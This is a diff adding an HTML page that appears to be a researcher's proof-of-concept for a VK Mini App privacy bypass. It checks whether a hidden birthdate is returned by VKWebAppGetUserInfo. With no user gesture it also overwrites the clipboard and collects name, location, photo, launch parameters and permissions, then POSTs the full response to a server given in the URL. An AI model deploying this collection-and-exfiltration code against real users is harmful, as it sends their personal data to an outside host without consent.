@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Privacy Test</title>
+<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" defer></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:20px;max-width:520px;margin:0 auto 14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+h2{font-size:17px;font-weight:600;text-align:center;margin-bottom:4px}
+.sub{font-size:11px;color:#818c99;text-align:center;margin-bottom:14px;line-height:1.5}
+.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;margin-left:6px;vertical-align:middle}
+.p-ok{background:#e3f8e9;color:#2eb851}.p-fail{background:#ffe4e4;color:#e64646}.p-wait{background:#eee;color:#818c99}
+.p-crit{background:#ff5252;color:#fff}.p-run{background:#e6f2ff;color:#0077ff}.p-bypass{background:#ff6f00;color:#fff}
+.row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f7f7f7}
+.rname{font-size:13px;color:#000;font-weight:500}
+.rdesc{font-size:11px;color:#818c99;margin-top:2px;line-height:1.4}
+.rval{font-size:12px;font-family:ui-monospace,monospace;color:#333;margin-top:4px;word-break:break-all}
+.section{font-size:14px;font-weight:600;color:#0077ff;margin:14px 0 6px;padding-top:10px;border-top:1px solid #f0f0f0}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:ui-monospace,monospace;font-size:10px;color:#aaa;max-height:500px;overflow-y:auto;margin-top:12px}
+#log p{margin:2px 0;line-height:1.4}
+.l-ok{color:#4caf50}.l-warn{color:#ffa726}.l-err{color:#ef5350}.l-crit{color:#ff5252;font-weight:700}.l-info{color:#64b5f6}.l-bypass{color:#ff6f00;font-weight:700}
+.verdict{font-size:16px;font-weight:700;text-align:center;padding:14px;border-radius:10px;margin:12px 0}
+.v-bypass{background:#fff3e0;color:#e65100;border:2px solid #ff6f00}
+.v-ok{background:#e8f5e9;color:#2e7d32;border:2px solid #4caf50}
+.v-wait{background:#f5f5f5;color:#999;border:2px solid #ddd}
+.btn-row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+.btn-row button{border:none;border-radius:8px;padding:10px 16px;font-size:12px;font-weight:600;cursor:pointer;background:#0077ff;color:#fff}
+.btn-row button.alt{background:#e64646}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>VK Bridge — DOB Privacy Bypass Test</h2>
+  <p class="sub">Tests whether VKWebAppGetUserInfo returns bdate when user set DOB visibility to "nobody".<br>
+  All methods fire on auto-launch (zero gesture required).</p>
+
+  <div class="verdict v-wait" id="verdict">Waiting for results...</div>
+
+  <div class="section">Privacy-Critical Fields</div>
+
+  <div class="row"><div>
+    <div class="rname">bdate (birthday) <span class="pill p-wait" id="s-bdate">WAIT</span></div>
+    <div class="rdesc">Expected: hidden (user set to "nobody"). If returned = PRIVACY BYPASS</div>
+    <div class="rval" id="v-bdate">—</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">bdate_visibility <span class="pill p-wait" id="s-bvis">WAIT</span></div>
+    <div class="rdesc">API visibility field — 0=hidden, 1=day+month, 2=full date</div>
+    <div class="rval" id="v-bvis">—</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">Full Name <span class="pill p-wait" id="s-name">WAIT</span></div>
+    <div class="rdesc">first_name + last_name</div>
+    <div class="rval" id="v-name">—</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">City / Country <span class="pill p-wait" id="s-loc">WAIT</span></div>
+    <div class="rdesc">city.title + country.title</div>
+    <div class="rval" id="v-loc">—</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">Photo URL <span class="pill p-wait" id="s-photo">WAIT</span></div>
+    <div class="rdesc">photo_200 — profile photo exposed to any Mini App</div>
+    <div class="rval" id="v-photo">—</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">is_closed <span class="pill p-wait" id="s-closed">WAIT</span></div>
+    <div class="rdesc">Whether profile is set to private</div>
+    <div class="rval" id="v-closed">—</div>
+  </div></div>
+
+  <div class="section">Other Data Exfil (auto-launch, zero gesture)</div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppCopyText <span class="pill p-wait" id="s-copy">WAIT</span></div>
+    <div class="rdesc">Silent clipboard overwrite</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetLaunchParams <span class="pill p-wait" id="s-launch">WAIT</span></div>
+    <div class="rdesc">Signed launch data</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetGrantedPermissions <span class="pill p-wait" id="s-perms">WAIT</span></div>
+    <div class="rdesc">Granted permissions recon</div>
+  </div></div>
+
+  <div class="section">Manual Re-test</div>
+  <div class="btn-row">
+    <button onclick="rerunUserInfo()">Re-run GetUserInfo</button>
+    <button onclick="rerunAll()">Re-run ALL probes</button>
+    <button class="alt" onclick="dumpRaw()">Dump raw JSON</button>
+  </div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+var q = new URLSearchParams(location.search);
+var SRV = q.get('srv') || '';
+var APP_ID = q.get('vk_app_id') || '(unknown)';
+var USER_ID = q.get('vk_user_id') || '(unknown)';
+var lastUserInfo = null;
+
+function ts(){ return new Date().toTimeString().slice(0,8); }
+function lg(msg, cls){
+  var d = document.getElementById('log');
+  var p = document.createElement('p');
+  if(cls) p.className = 'l-' + cls;
+  p.textContent = '[' + ts() + '] ' + msg;
+  d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function pill(id, txt, cls){
+  var e = document.getElementById('s-' + id);
+  if(e){ e.textContent = txt; e.className = 'pill ' + cls; }
+}
+function setVal(id, txt){
+  var e = document.getElementById('v-' + id);
+  if(e) e.textContent = txt;
+}
+function setVerdict(bypass, detail){
+  var el = document.getElementById('verdict');
+  if(bypass){
+    el.textContent = 'PRIVACY BYPASS CONFIRMED — ' + detail;
+    el.className = 'verdict v-bypass';
+  } else {
+    el.textContent = 'Privacy respected — ' + detail;
+    el.className = 'verdict v-ok';
+  }
+}
+async function post(type, data){
+  if(!SRV) return;
+  try{
+    await fetch(SRV + '/log?type=' + encodeURIComponent(type), {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(Object.assign({}, data, {app_id: APP_ID, user_id: USER_ID, _ts: Date.now(),
+        ua: navigator.userAgent, href: location.href}))
+    });
+  }catch(e){}
+}
+
+async function probeUserInfo(){
+  var t0 = Date.now();
+  try{
+    var r = await vkBridge.send('VKWebAppGetUserInfo', {});
+    var ms = Date.now() - t0;
+    lastUserInfo = r;
+
+    var bdate = r.bdate || null;
+    var bvis = r.bdate_visibility;
+    var name = (r.first_name || '') + ' ' + (r.last_name || '');
+    var city = r.city ? r.city.title : '(none)';
+    var country = r.country ? r.country.title : '(none)';
+    var photo = r.photo_200 || '(none)';
+
+    setVal('name', name + ' (id' + r.id + ')');
+    pill('name', 'HIT ' + ms + 'ms', 'p-crit');
+    setVal('loc', city + ', ' + country);
+    pill('loc', city ? 'HIT' : 'empty', city ? 'p-crit' : 'p-ok');
+    setVal('photo', photo.slice(0, 80) + '...');
+    pill('photo', photo !== '(none)' ? 'EXPOSED' : 'none', photo !== '(none)' ? 'p-crit' : 'p-ok');
+    setVal('closed', String(r.is_closed));
+    pill('closed', String(r.is_closed), 'p-wait');
+
+    if(bdate){
+      setVal('bdate', bdate);
+      pill('bdate', 'BYPASS — ' + bdate, 'p-bypass');
+      lg('!!! PRIVACY BYPASS: bdate=' + bdate + ' returned despite "nobody" setting !!!', 'bypass');
+      setVerdict(true, 'bdate="' + bdate + '" returned (user set visibility to "nobody")');
+    } else {
+      setVal('bdate', '(not returned)');
+      pill('bdate', 'HIDDEN', 'p-ok');
+      lg('bdate not returned — privacy setting respected', 'ok');
+    }
+
+    if(typeof bvis !== 'undefined'){
+      setVal('bvis', String(bvis) + ' (0=hidden, 1=day+month, 2=full)');
+      if(bvis === 0 && bdate){
+        pill('bvis', 'VIS=0 BUT BDATE LEAKED!', 'p-bypass');
+        lg('!!! bdate_visibility=0 (hidden) but bdate STILL returned = confirmed bypass !!!', 'bypass');
+      } else {
+        pill('bvis', 'vis=' + bvis, bvis === 0 ? 'p-ok' : 'p-warn');
+      }
+    } else {
+      setVal('bvis', '(field not in response)');
+      pill('bvis', 'absent', 'p-wait');
+    }
+
+    if(!bdate && (typeof bvis === 'undefined' || bvis === 0)){
+      setVerdict(false, 'bdate not returned, visibility=' + (typeof bvis !== 'undefined' ? bvis : 'absent'));
+    }
+
+    lg('GetUserInfo (' + ms + 'ms): name=' + name + ' bdate=' + (bdate || 'HIDDEN') +
+       ' bvis=' + bvis + ' city=' + city + ' photo=' + (photo ? 'yes' : 'no'), 'crit');
+
+    post('PRIVACY_USERINFO_HIT', {
+      elapsed_ms: ms,
+      bdate: bdate,
+      bdate_visibility: bvis,
+      name: name,
+      user_id: r.id,
+      city: city,
+      country: country,
+      photo: photo ? 'present' : 'absent',
+      is_closed: r.is_closed,
+      privacy_bypass: !!bdate,
+      full_response: JSON.stringify(r)
+    });
+
+    return r;
+  }catch(e){
+    var ms2 = Date.now() - t0;
+    var err = typeof e === 'object' ? JSON.stringify(e).slice(0,300) : String(e);
+    lg('GetUserInfo FAILED (' + ms2 + 'ms): ' + err, 'err');
+    pill('bdate', 'ERROR', 'p-fail');
+    post('PRIVACY_USERINFO_FAIL', {elapsed_ms: ms2, error: err});
+  }
+}
+
+async function probeOther(){
+  var probes = [
+    {id: 'copy', method: 'VKWebAppCopyText', params: {text: 'PROBE_PRIVACY_' + Date.now()}, extract: function(r){
+      lg('CopyText: clipboard overwritten — ' + JSON.stringify(r), 'crit');
+      return r;
+    }},
+    {id: 'launch', method: 'VKWebAppGetLaunchParams', params: {}, extract: function(r){
+      lg('LaunchParams: ' + JSON.stringify(r).slice(0,300), 'crit');
+      return r;
+    }},
+    {id: 'perms', method: 'VKWebAppGetGrantedPermissions', params: {}, extract: function(r){
+      lg('GrantedPermissions: ' + JSON.stringify(r), 'crit');
+      return r;
+    }}
+  ];
+
+  for(var i = 0; i < probes.length; i++){
+    var p = probes[i];
+    var t0 = Date.now();
+    try{
+      var r = await vkBridge.send(p.method, p.params);
+      var ms = Date.now() - t0;
+      p.extract(r);
+      pill(p.id, 'HIT ' + ms + 'ms', 'p-crit');
+      post(p.id.toUpperCase() + '_HIT', {method: p.method, elapsed_ms: ms,
+        result: JSON.stringify(r).slice(0,500)});
+    }catch(e){
+      var ms2 = Date.now() - t0;
+      lg(p.method + ': ' + (typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e)), 'err');
+      pill(p.id, 'blocked', 'p-fail');
+      post(p.id.toUpperCase() + '_FAIL', {method: p.method, elapsed_ms: ms2,
+        error: typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e)});
+    }
+  }
+}
+
+function rerunUserInfo(){ probeUserInfo(); }
+function rerunAll(){ boot(); }
+function dumpRaw(){
+  if(lastUserInfo){
+    lg('RAW GetUserInfo: ' + JSON.stringify(lastUserInfo, null, 2), 'info');
+  } else {
+    lg('No GetUserInfo result yet', 'err');
+  }
+}
+
+async function boot(){
+  for(var i = 0; i < 30 && !window.vkBridge; i++)
+    await new Promise(function(r){ setTimeout(r, 150); });
+
+  if(!window.vkBridge){
+    lg('vkBridge not loaded — not in Mini App context', 'err');
+    document.getElementById('verdict').textContent = 'ERROR: Not in VK Mini App context';
+    document.getElementById('verdict').className = 'verdict v-bypass';
+    return;
+  }
+
+  try{
+    await vkBridge.send('VKWebAppInit');
+    lg('VKWebAppInit OK — app_id=' + APP_ID + ' user_id=' + USER_ID, 'ok');
+    post('VK_INIT_OK', {app_id: APP_ID, user_id: USER_ID});
+  }catch(e){
+    lg('VKWebAppInit failed: ' + JSON.stringify(e).slice(0,200), 'err');
+    post('VK_INIT_FAIL', {error: JSON.stringify(e).slice(0,200)});
+  }
+
+  lg('=== PRIVACY BYPASS TEST — DOB visibility set to "nobody" ===', 'warn');
+  lg('Testing VKWebAppGetUserInfo for bdate leak...', 'warn');
+  await probeUserInfo();
+
+  lg('=== OTHER DATA EXFIL PROBES ===', 'warn');
+  await probeOther();
+
+  lg('=== DONE — check verdict above ===', 'warn');
+}
+
+boot();
+</script>
+</body>
+</html>
